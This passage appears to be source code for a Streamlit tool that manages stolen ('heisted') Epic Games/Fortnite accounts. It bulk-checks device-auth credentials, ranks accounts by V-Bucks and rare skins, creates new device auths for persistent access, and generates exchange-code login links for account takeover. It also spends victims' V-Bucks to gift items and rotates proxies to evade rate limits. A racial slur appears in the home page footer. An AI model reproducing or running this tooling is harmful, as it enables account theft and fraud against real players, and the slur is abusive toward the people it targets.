                                            gift_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{selected_account["account_id"]}/client/GiftCatalogEntry?profileId=common_core&rvn=-1'
                                            
                                            gift_data = json.dumps({
                                                "offerId": offer["offerId"],
                                                "currency": "MtxCurrency",
                                                "currencySubType": "", 
                                                "expectedTotalPrice": offer["price"]["final"],
                                                "gameContext": "Frontend.CatabaScreen",
                                                "receiverAccountIds": [gift_to_id],
                                                "giftWrapTemplateId": "",
                                                "personalMessage": ""
                                            })
                                            
                                            gift_headers = {
                                                'Content-Type': 'application/json',
                                                'Authorization': f'Bearer {access_token}'
                                            }
                                            
                                            gift_req = requests.post(url=gift_url, headers=gift_headers, data=gift_data)
                                            
                                            if gift_req.status_code == 200:
                                                success = True
                                                
                                                # Update account V-Bucks in database
                                                try:
                                                    # Find and update the account that sent the gift
                                                    for i, acc in enumerate(accounts):
                                                        if acc["account_id"] == selected_account["account_id"]:
                                                            accounts[i]["vbucks"] -= offer["price"]["final"]
                                                            break
                                                            
                                                    # Save updated accounts back to file
                                                    with open(gift_file_path, "w", encoding="utf-8") as f:
                                                        json.dump(accounts, f, indent=4)
                                                        
                                                    st.success(f"""
                                                    ? Gift sent successfully with {platform}!
                                                    - Item: {offer['name']}
                                                    - To: {recipient}
                                                    - From: {selected_account['display_name']}
                                                    - Price: {offer['price']['final']} V-Bucks
                                                    - Remaining V-Bucks: {selected_account['vbucks'] - offer['price']['final']}
                                                    """)
                                                except Exception as e:
                                                    st.error(f"Failed to update V-Bucks in database: {str(e)}")
                                                break
                                            elif "errors.com.epicgames.modules.gamesubcatalog.purchase_not_allowed" in str(gift_req.json()):
                                                st.warning(f"{platform} account needs 2FA enabled. Trying next platform...")
                                            else:
                                                st.warning(f"Gift failed with {platform}. Trying next platform...")
                                        else:
                                            st.warning(f"Authentication failed with {platform}. Trying next platform...")
                                            
                                    except Exception as e:
                                        st.error(f"Error with {platform}: {str(e)}")
                                
                                if not success:
                                    st.error("Failed to send gift with both Android and iOS")
                              
                            except Exception as e:
                                st.error(f"Error in gift process: {str(e)}")
                    else:
                        st.warning("This item cannot be gifted")
                
                # Add some spacing between items
                st.markdown("---")
            
            # Move to next column
            current_col = (current_col + 1) % 4

    except Exception as e:
        st.error(f"Error loading item shop: {str(e)}")

async def convert_ios_to_android(accounts):
    st.write("Converting iOS accounts to Android...")
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    async def convert_account(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient):
        # First authenticate with iOS credentials
        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
        ios_token = "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic {ios_token}'
        }
        
        data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"
        
        try:
            # Get iOS access token
            req = await client.post(url=url, headers=headers, data=data)
            if req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            access_token = req.json()["access_token"]
            
            # Get exchange code
            exchange_url = 'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/exchange'
            exchange_headers = {
                'Authorization': f'Bearer {access_token}'
            }
            
            exchange_req = await client.get(url=exchange_url, headers=exchange_headers)
            exchange_code = exchange_req.json()['code']
            
            # Convert to Android using exchange code
            android_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            android_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            android_data = f"grant_type=exchange_code&exchange_code={exchange_code}"
            
            android_req = await client.post(url=android_url, headers=android_headers, data=android_data)
            
            if android_req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            android_token = android_req.json()["access_token"]
            android_account_id = android_req.json()["account_id"]
            
            # Generate new device auth
            device_auth_url = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{android_account_id}/deviceAuth'
            device_auth_headers = {
                "Authorization": f'Bearer {android_token}',
                "Content-Type": "application/json"
            }
            
            device_auth_req = await client.post(url=device_auth_url, headers=device_auth_headers, data="{}")
            
            if device_auth_req.status_code != 200:
                st.session_state.failed += 1
                return None
            
            new_device_id = device_auth_req.json()["deviceId"]
            new_secret = device_auth_req.json()["secret"]
            
            # Get account details like the authenticate function
            profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'
            headers = {
                'Content-Type': 'application/json',
                'Authorization': f'Bearer {android_token}'
            }
            
            profile = await client.post(url=profile_url, headers=headers, data="{}")
            profile_data = profile.json()
            
            # Calculate vbucks
            vbucks = 0
            try:
                items = profile_data['profileChanges'][0]['profile']['items']
                for item in items:
                    if items[item]['templateId'][:12] == "Currency:Mtx":
                        vbucks += items[item]['quantity']
            except:
                vbucks = 0
            
            st.session_state.passed += 1
            
            return {
                "vbucks": vbucks,
                "account_id": account_id,
                "device_id": new_device_id,
                "secret": new_secret,
                "display_name": display_name
            }
            
        except Exception as e:
            st.error(f"Conversion error: {str(e)}")
            st.session_state.failed += 1
            return None

    async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
        tasks = []
        for account in accounts:
            task = convert_account(
                account_id=account["AccountId"],
                device_id=account["DeviceId"],
                secret=account["Secret"],
                display_name=account["DisplayName"],
                account=account,
                client=client
            )
            tasks.append(task)
        
        results = []
        for i, task in enumerate(asyncio.as_completed(tasks)):
            result = await task
            if result:
                results.append(result)
            progress = (i + 1) / len(tasks)
            progress_bar.progress(progress)
            status_text.text(f"Converted {i+1}/{len(tasks)} accounts")
    
    # Save the converted accounts
    if results:
        filename = os.path.basename(st.session_state.loaded_db).split("db.json")[0]
        output_path = f"./dbs/checked/android_checked_{filename}.json"
        with open(output_path, "w") as f:
            json.dump(results, f, indent=4)
        st.success(f"Successfully converted {len(results)} accounts. Saved to {output_path}")
    else:
        st.error("No accounts were successfully converted")

async def authenticate(account_id, device_id, secret, display_name, account, client: httpx.AsyncClient, client_token: str):
    url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Authorization': f'basic {client_token}'
    }
    
    data = f"grant_type=device_auth&account_id={account_id}&device_id={device_id}&secret={secret}"
    
    try:
        req = await client.post(url=url, headers=headers, data=data)
        st.session_state.total += 1
        
        if req.status_code != 200:
            st.session_state.failed += 1
            return None
            
        auth_info = req.json()
        access_token = auth_info["access_token"]
        display_name = auth_info["displayName"]

        # Get account lookup for last login
        account_lookup_url = f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account_id}"
        headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {access_token}'
        }
        account_lookup = await client.get(url=account_lookup_url, headers=headers)
        try:
            last_login = account_lookup.json()["lastLogin"]
        except:
            last_login = "not available"

        # Get account details and vbucks
        profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=common_core&rvn=-1'
        headers = {
            'Content-Type': 'application/json',
            'Authorization': f'Bearer {access_token}'
        }
        
        composemcp = await client.post(url=profile_url, headers=headers, data="{}")
        composemcp = composemcp.json()

        # Calculate vbucks
        vbucks = 0
        try:
            items = composemcp['profileChanges'][0]['profile']['items']
            for item in items:
                if items[item]['templateId'][:12] == "Currency:Mtx":
                    vbucks += items[item]['quantity']
        except:
            vbucks = 0

        # Get BR profile for skins
        br_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{account_id}/client/QueryProfile?profileId=athena&rvn=-1'
        br_profile = await client.post(url=br_url, headers=headers, data="{}")
        
        try:
            last_br_match = br_profile.json()["profileChanges"][0]["profile"]["stats"]["attributes"]["last_match_end_datetime"]
        except:
            last_br_match = "2027-08-11T03:47:40.318Z"

        # Check for special skins
        special_skins = []
        composemcp = br_profile.text.lower()
        
        skin_checks = {
            "CID_703_Athena_Commando_M_Cyclone": "Travis Scott",
            "CID_434_Athena_Commando_F_StealthHonor": "Wonder",
            "CID_342_Athena_Commando_M_StreetRacerMetallic": "Honor Guard",
            "CID_175_Athena_Commando_M_Celestial": "Galaxy",
            "CID_313_Athena_Commando_M_KpopFashion": "Ikonik",
            "CID_028_Athena_Commando_F": "Renegade Raider",
            "CID_017_Athena_Commando_M": "Aerial Assault Trooper",
            "CID_516_Athena_Commando_M_BlackWidowRogue": "Rogue Spider Knight",
            "CID_479_Athena_Commando_F_Davinci": "Glow",
            "CID_386_Athena_Commando_M_StreetOpsStealth": "Stealth Reflex",
            "Character_MasterKeyOrder": "Huntmaster Saber",
            "CID_850_Athena_Commando_F_SkullBriteCube": "Dark Skully",
            "CID_515_Athena_Commando_M_BarbequeLarry": "Psycho Bandit",
            "Pickaxe_ID_398_WildCatFemale": "Electri-Claw",
            "CID_757_Athena_Commando_F_WildCat": "Wildcat",
            "CID_371_Athena_Commando_M_SpeedyMidnight": "Dark Vertex",
            "CID_183_Athena_Commando_M_ModernMilitaryRed": "Double Helix"
        }

        for skin_id, skin_name in skin_checks.items():
            if skin_id.lower() in composemcp:
                special_skins.append(skin_name)

        st.session_state.passed += 1
        
        # Get exchange code for web link
        try:
            exchange_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
            exchange_headers = {"Authorization": f"Bearer {access_token}"}
            exchange_response = await client.get(exchange_url, headers=exchange_headers)
            token = exchange_response.json()["code"]
            web_link = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
        except:
            web_link = None

        return {
            "vbucks": vbucks,
            "account_id": account_id,
            "device_id": device_id,
            "secret": secret,
            "display_name": display_name,
            "web_link": web_link,
            "special_skins": special_skins,
            "last_login": last_login,
            "last_br_match": last_br_match,
            "skin_count": len(special_skins)
        }

    except Exception as e:
        st.error(f"Authentication error: {str(e)}")
        st.session_state.failed += 1
        return None

async def check_credentials(accounts, client_type="ios"):
    client_tokens = {
        "ios": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=",
        "android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
    }
    
    # Use the appropriate client token based on client type
    client_token = client_tokens[client_type]
    
    progress_bar = st.progress(0)
    status_text = st.empty()
    
    # Reset counters
    st.session_state.passed = 0
    st.session_state.failed = 0
    st.session_state.total = 0
    
    async with httpx.AsyncClient(limits=httpx.Limits(max_keepalive_connections=20, max_connections=50)) as client:
        tasks = []
        
        # If accounts is a list of accounts, process it directly
        if isinstance(accounts, list):
            account_list = accounts
        # If accounts is a dict with multiple accounts
        elif isinstance(accounts, dict):
            # Try to get accounts from different possible structures
            if "sus" in accounts:
                account_list = accounts["sus"]
            else:
                # If it's a single account dict
                account_list = [accounts]
        else:
            st.error("Invalid account data format")
            return []

        for account in account_list:
            # Handle MongoDB-style documents
            if "_id" in account:
                task = authenticate(
                    account_id=account.get("AccountId", ""),
                    device_id=account.get("DeviceId", ""),
                    secret=account.get("Secret", ""),
                    display_name=account.get("DisplayName", ""),
                    account=account,
                    client=client,
                    client_token=client_token
                )
            # Handle checked format
            elif "account_id" in account:
                task = authenticate(
                    account_id=account["account_id"],
                    device_id=account["device_id"],
                    secret=account["secret"],
                    display_name=account["display_name"],
                    account=account,
                    client=client,
                    client_token=client_token
                )
            # Handle unchecked format
            elif "AccountId" in account:
                task = authenticate(
                    account_id=account["AccountId"],
                    device_id=account["DeviceId"],
                    secret=account["Secret"],
                    display_name=account["DisplayName"],
                    account=account,
                    client=client,
                    client_token=client_token
                )
            else:
                st.warning(f"Skipping invalid account format: {account}")
                continue
                
            tasks.append(task)
        
        results = []
        for i, task in enumerate(asyncio.as_completed(tasks)):
            result = await task
            if result:
                results.append(result)
            progress = (i + 1) / len(tasks)
            progress_bar.progress(progress)
            status_text.text(f"Processed {i+1}/{len(tasks)} accounts")
    
    # Save the results
    if results:
        filename = os.path.basename(st.session_state.loaded_db).split(".json")[0]
        output_path = f"./dbs/checked/checked_{filename}.json"
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=4)
        st.success(f"Successfully checked {len(results)} accounts. Saved to {output_path}")
        st.info(f"Passed: {st.session_state.passed}, Failed: {st.session_state.failed}, Total: {st.session_state.total}")
    else:
        st.error("No accounts were successfully checked")
        st.info(f"Passed: {st.session_state.passed}, Failed: {st.session_state.failed}, Total: {st.session_state.total}")
    
    return sorted(results, key=lambda x: x['skin_count'], reverse=True)

def check_heisted_vbucks_page():
    st.title("Check Heisted V-Bucks")
    
    # Create a container for the buttons
    heist_container = st.container()

    found_files = False
    with heist_container:
        # Look in the correct directory
        for file in os.listdir("./dbs/"):
            if file.startswith("added_") and file.endswith(".json"):
                found_files = True
                account_id = file.replace("added_", "").replace(".json", "")
                
                if st.button(f"Check {account_id}", key=f"check_{account_id}"):
                    try:
                        # Use the correct path to read the file
                        with open(f"./dbs/{file}", "r", encoding="utf-8") as f:
                            accounts = json.load(f)
                        total_vbucks = sum(acc.get("vbucks", 0) for acc in accounts)
                        st.success(f"Account {account_id} has {total_vbucks:,} V-Bucks available")
                    except Exception as e:
                        st.error(f"Error checking account: {str(e)}")
    
    if not found_files:
        st.warning("No heisted accounts found. Add accounts first using the Heist Management page.")

async def create_android_token(account):
    """Create an Android token for the selected account"""
    try:
        async with httpx.AsyncClient() as client:
            # Android token generation
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
            
            # Get access token
            auth_response = await client.post(url=url, headers=headers, data=data)
            
            if auth_response.status_code != 200:
                st.error(f"Failed to authenticate with Android credentials: {auth_response.text}")
                return
            
            access_token = auth_response.json()["access_token"]
            
            # Get exchange code
            exchange_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
            exchange_headers = {"Authorization": f"Bearer {access_token}"}
            
            exchange_response = await client.get(exchange_url, headers=exchange_headers)
            
            if exchange_response.status_code != 200:
                st.error("Failed to get exchange code")
                return
            
            exchange_code = exchange_response.json()["code"]
            web_link = f"https://www.epicgames.com/id/exchange?exchangeCode={exchange_code}&redirectUrl=https://www.epicgames.com/"
            
            # Display results in a nice format without using expander
            st.markdown("### \U0001F4BB Generated Login Link")
            st.code(web_link, language="text")
            
            col1, col2 = st.columns([3, 1])
            
    except Exception as e:
        st.error(f"Error creating token: {str(e)}")
        
async def create_android_bearertoken(account):
    """Create an Android token for the selected account"""
    try:
        async with httpx.AsyncClient() as client:
            # Android token generation
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
            
            # Get access token
            auth_response = await client.post(url=url, headers=headers, data=data)
            
            if auth_response.status_code != 200:
                st.error(f"Failed to authenticate with Android credentials: {auth_response.text}")
                return
            
            access_token = auth_response.json()["access_token"]

            st.markdown("### \U0001F512 Generated Android Bearer Token")
            st.code(access_token, language="text")
            
            col1, col2 = st.columns([3, 1])
            
    except Exception as e:
        st.error(f"Error creating token: {str(e)}")

async def add_friend(account, friend_display_name):
    """Add a friend using display name"""
    try:
        if not friend_display_name:
            st.error("Please enter a display name")
            return
            
        async with httpx.AsyncClient() as client:
            # First get an access token
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            data = f"grant_type=device_auth&account_id={account['accountId']}&device_id={account['deviceId']}&secret={account['secret']}"
            
            auth_response = await client.post(url=url, headers=headers, data=data)
            
            if auth_response.status_code != 200:
                st.error("Failed to authenticate")
                return
                
            access_token = auth_response.json()["access_token"]
            
            # Get friend's account ID from display name
            lookup_headers = {
                "Authorization": f"bearer {access_token}",
                "Content-Type": "application/json"
            }
            
            lookup_response = await client.get(
                f"https://account-public-service-prod.ol.epicgames.com/account/api/public/account/displayName/{friend_display_name}",
                headers=lookup_headers
            )
            
            if lookup_response.status_code != 200:
                st.error(f"Could not find user '{friend_display_name}'")
                return
                
            friend_id = lookup_response.json()['id']
            
            # Send friend request
            add_friend_response = await client.post(
                f'https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account["accountId"]}/friends/{friend_id}',
                headers=lookup_headers
            )
            
            # Handle different response cases
            if add_friend_response.status_code == 400:
                error_code = add_friend_response.json().get('errorCode')
                if error_code == "errors.com.epicgames.friends.friend_request_already_sent":
                    st.warning(f"Friend request already sent to {friend_display_name}, or they accepted it.")
                elif error_code == "errors.com.epicgames.friends.cannot_friend_blocked_account":
                    st.error(f"{friend_display_name} has blocked you.")
                else:
                    st.error(f"Error: {add_friend_response.json()}")
            elif add_friend_response.status_code == 403 and add_friend_response.json().get('errorCode') == "errors.com.epicgames.friends.cannot_friend_due_to_target_settings":
                st.error(f"{friend_display_name} has incoming friend requests turned off.")
            elif add_friend_response.status_code == 204:
                st.success(f"Sent friend request to {friend_display_name}")
            else:
                st.error(f"Error: {add_friend_response.status_code}. Response: {add_friend_response.json()}")
                
    except Exception as e:
        st.error(f"Error adding friend: {str(e)}")

async def createDA(account):
    """Creates a Device Auth"""
    try:
        async with httpx.AsyncClient() as client:
            # Android token generation
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
            
            # Get access token
            auth_response = await client.post(url=url, headers=headers, data=data)
            
            if auth_response.status_code != 200:
                st.error(f"Failed to authenticate with Android credentials: {auth_response.text}")
                return
            
            access_token = auth_response.json()["access_token"]

            daUrl = f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{account["account_id"]}/deviceAuth'

            headers = {
                'Content-Type': 'application/json',
                'Authorization' : f'bearer {access_token}'
            }

            da_response = await client.post(url=daUrl, headers=headers)

            if da_response.status_code != 200:
                st.error(f"Failed to create a device auth: {da_response.text}")
                return
            
            deviceAuthResponse = da_response.json()

            deviceId = deviceAuthResponse['deviceId']
            accountId = deviceAuthResponse['accountId']
            secret = deviceAuthResponse['secret']

            st.markdown("### \U0001F510 Generated Android Device Auth")

            col1, col2 = st.columns(2)

            with col1:
                st.markdown("**Display Name**")
                st.code(account['display_name'])

                st.markdown("**Account ID**")
                st.code(accountId)

            with col2:
                st.markdown("**Device ID**")
                st.code(deviceId)

                st.markdown("**Secret**")
                st.code(secret)

    except Exception as e:
        st.error(f"Error creating token: {str(e)}")

def account_management_page():
    st.title("Account Management")
    
    try:
        # Load device auths
        with open("device_auths.json", "r", encoding="utf-8") as f:
            device_auths = json.load(f)
        
        # Create account selection
        st.subheader("Select Account")
        
        # Create a formatted display name for each account
        account_options = {
            f"{acc.get('display_name', 'Unknown')} ({acc.get('account_id', 'Unknown ID')})": acc 
            for acc in device_auths
        }
        
        selected_display_name = st.selectbox(
            "Choose an account",
            options=list(account_options.keys()),
            key="account_selector"
        )
        
        if selected_display_name:
            selected_account = account_options[selected_display_name]
            st.session_state.selected_account = selected_account

            tab1, tab2, tab3, tab4 = st.tabs(["\U0001F4DD Account Info", "\U0001F6E0 Token Generation", "\U0001F91D Friends", "Create Device Auth"])
            
            # Show account details in a nicer format using expander
            st.markdown("---")
            
            # Account Info Box
            with tab1:
                col1, col2 = st.columns(2)
                with col1:
                    st.markdown("**Display Name**")
                    st.code(selected_account.get('display_name', 'Unknown'))
                    
                    st.markdown("**Account ID**")
                    st.code(selected_account.get('account_id', 'Unknown'))
                
                with col2:
                    st.markdown("**Device ID**")
                    st.code(selected_account.get('device_id', 'Unknown'))

                    st.markdown("**Secret**")
                    st.code(selected_account.get('secret', 'Unknown'))
            
            # Token Generation Box
            with tab2:
                if st.button("Generate Web Login", use_container_width=True):
                    asyncio.run(create_android_token(selected_account))
                if st.button("Generate Android Token", use_container_width=True):
                    asyncio.run(create_android_bearertoken(selected_account))

            with tab3:
                st.markdown("### coming soon saar!!")
            with tab4:
                if st.button("Create Device Auth", use_container_width=True):
                    asyncio.run(createDA(selected_account))

    except FileNotFoundError:
        st.error("device_auths.json not found. Please make sure the file exists in the correct location.")
    except Exception as e:
        st.error(f"Error loading accounts: {str(e)}")

def get_friend_data(friend, headers):
    """Get friend's display name using their ID"""
    try:
        friend_id = friend.get('account_id')
        if not friend_id:
            return None
            
        # Add proxy to avoid rate limiting
        proxy = random.choice(PROXIES)
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        
        friend_response = requests.get(
            f'https://account-public-service-prod.ol.epicgames.com/account/api/public/account/{friend_id}',
            headers=headers,
            proxies=proxies,
            timeout=15,
            verify=False  # Disable SSL verification
        )
        
        if friend_response.status_code == 200:
            friend_data = friend_response.json()
            mutual = friend.get('mutual', 0)
            created = friend.get('created', '').split('T')[0]  # Get just the date part
            display_name = friend_data.get('displayName', 'Unknown')
            
            # Format the friend info
            friend_info = (
                friend_id,
                f"{display_name}\n"
                f"Mutual Friends: {mutual}\n"
                f"Added: {created}"
            )
            return friend_info
        else:
            print(f"Failed to get friend data for {friend_id}: Status {friend_response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"Request error for {friend_id}: {str(e)}")
    except Exception as e:
        print(f"Error getting friend data for {friend_id}: {str(e)}")
    return None

async def get_friends_list(account):
    """Get friends list using threading"""
    try:
        async with httpx.AsyncClient() as client:
            # First get an access token
            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
            android_token = "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
            
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': f'basic {android_token}'
            }
            
            data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
            
            auth_response = await client.post(url=url, headers=headers, data=data)
            
            if auth_response.status_code != 200:
                st.error("Failed to authenticate")
                return
                
            access_token = auth_response.json()["access_token"]
            
            # Get friends summary
            headers = {
                "Authorization": f"bearer {access_token}",
                "Content-Type": "application/json"
            }
            
            summary_response = await client.get(
                f'https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account["account_id"]}/summary',
                headers=headers
            )
            
            if summary_response.status_code != 200:
                st.error("Failed to get friends list")
                return
            
            # Get the friends list from the response
            friends_data = summary_response.json()
            friends = friends_data.get('friends', [])
            
            if not friends:
                st.warning("No friends found")
                return
            
            # Show total friends found
            total_friends = len(friends)
            st.info(f"Loading {total_friends} friends...")
            
            # Process friends in smaller batches
            batch_size = 20  # Reduced batch size
            results = []
            total_batches = (total_friends + batch_size - 1) // batch_size
            
            progress_bar = st.progress(0)
            progress_text = st.empty()
            
            for batch_num in range(total_batches):
                start_idx = batch_num * batch_size
                end_idx = min(start_idx + batch_size, total_friends)
                current_batch = friends[start_idx:end_idx]
                
                # Use threading for current batch
                with ThreadPoolExecutor(max_workers=5) as executor:  # Reduced workers
                    batch_futures = [
                        executor.submit(get_friend_data, friend, headers)
                        for friend in current_batch
                    ]
                    
                    # Collect batch results
                    for future in batch_futures:
                        result = future.result()
                        if result:
                            results.append(result)
                
                # Update progress
                progress = (batch_num + 1) / total_batches
                progress_bar.progress(progress)
                progress_text.text(f"Processing batch {batch_num + 1}/{total_batches} ({len(results)} friends loaded)")
                
                # Add a small delay between batches to avoid rate limiting
                await asyncio.sleep(1)
            
            # Store results and reset page
            st.session_state.friends_list = results
            st.session_state.current_page = 1
            
            progress_bar.empty()
            progress_text.empty()
            st.success(f"Successfully loaded {len(results)} friends")
            
    except Exception as e:
        st.error(f"Error getting friends list: {str(e)}")

# Add this to initialize session state variables
if 'show_client_choice' not in st.session_state:
    st.session_state.show_client_choice = False

def sort_account_files_page():
    st.title("Sort Account Files")
    
    if not st.session_state.loaded_db:
        st.warning("Please load a database first!")
        return
    
    sort_options = ["V-Bucks", "Skin Count", "Active Date"]
    sort_choice = st.selectbox("Sort by:", sort_options)
    
    if st.button("Sort"):
        try:
            with open(st.session_state.loaded_db, "r", encoding="utf-8") as f:
                accounts = json.load(f)
            
            if sort_choice == "V-Bucks":
                sorted_accounts = sorted(accounts, key=lambda x: x.get("vbucks", 0), reverse=True)
            elif sort_choice == "Skin Count":
                sorted_accounts = sorted(accounts, key=lambda x: len(x.get("special_skins", [])), reverse=True)
            else:  # Active Date
                sorted_accounts = sorted(accounts, key=lambda x: parser.parse(x.get("last_br_match", "2000-01-01")), reverse=True)
            
            with open(st.session_state.loaded_db, "w", encoding="utf-8") as f:
                json.dump(sorted_accounts, f, indent=4)
            
            st.success("Accounts sorted successfully!")
            
        except Exception as e:
            st.error(f"Error sorting accounts: {str(e)}")

def get_account_info_page():
    st.title("Get Account Info")
    
    account_id = st.text_input("Enter Account ID")
    
    if st.button("Get Info"):
        found = False
        for file in os.listdir("./dbs/checked/"):
            if not file.endswith(".json"):
                continue
                
            try:
                with open(f"./dbs/checked/{file}", "r", encoding="utf-8") as f:
                    accounts = json.load(f)
                
                # Find and update the account
                for i, acc in enumerate(accounts):
                    if acc["account_id"] == account_id:
                        found = True
                        # Get new web_link
                        try:
                            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
                            headers = {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Authorization': f'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='
                            }
                            data = f"grant_type=device_auth&account_id={acc['account_id']}&device_id={acc['device_id']}&secret={acc['secret']}"
                            
                            req = requests.post(url=url, headers=headers, data=data)
                            if req.status_code == 200:
                                access_token = req.json()["access_token"]
                                
                                # Get exchange code
                                exchange_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                                exchange_headers = {"Authorization": f"Bearer {access_token}"}
                                exchange_response = requests.get(exchange_url, headers=exchange_headers)
                                
                                if exchange_response.status_code == 200:
                                    token = exchange_response.json()["code"]
                                    new_web_link = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
                                    
                                    # Update the web_link in the account
                                    accounts[i]["web_link"] = new_web_link
                                    
                                    # Save the updated accounts back to the file
                                    with open(f"./dbs/checked/{file}", "w", encoding="utf-8") as f:
                                        json.dump(accounts, f, indent=4)
                                    
                                    # Copy to clipboard and show success message
                                    pyperclip.copy(new_web_link)
                                    st.success("New web link generated and copied to clipboard!")
                        except Exception as e:
                            st.error(f"Error generating new web link: {str(e)}")
                        
                        # Display the account info
                        st.json(accounts[i])
                        break
                        
                if found:
                    break
                    
            except Exception as e:
                st.error(f"Error reading file {file}: {str(e)}")
                
        if not found:
            st.warning("Account not found in any database")

def home_page():
    st.title("Account Gift Manager")
    st.markdown("""
    this is the account gifting manager and account manager for us \U0001F381 \U0001F381 \U0001F381 \U0001F381 \U0001F381 \U0001F381 \U0001F381 \U0001F381
    """)
    footer_html = """<div style='text-align: center;'> <p>you a bitch ass nigga botlmao</p> </div>"""
    st.markdown(footer_html, unsafe_allow_html=True)

async def auto_accept_friends(account, stop_flag):
    """Auto accept friend requests for an account"""
    try:
        # First get auth token
        url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'basic M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU='
        }
        data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
        
        async with httpx.AsyncClient() as client:
            auth_req = await client.post(url=url, headers=headers, data=data)
            if auth_req.status_code != 200:
                return False
            
            access_token = auth_req.json()["access_token"]
            
            status_placeholder = st.empty()
            total_accepted = 0
            
            while not stop_flag[0]:
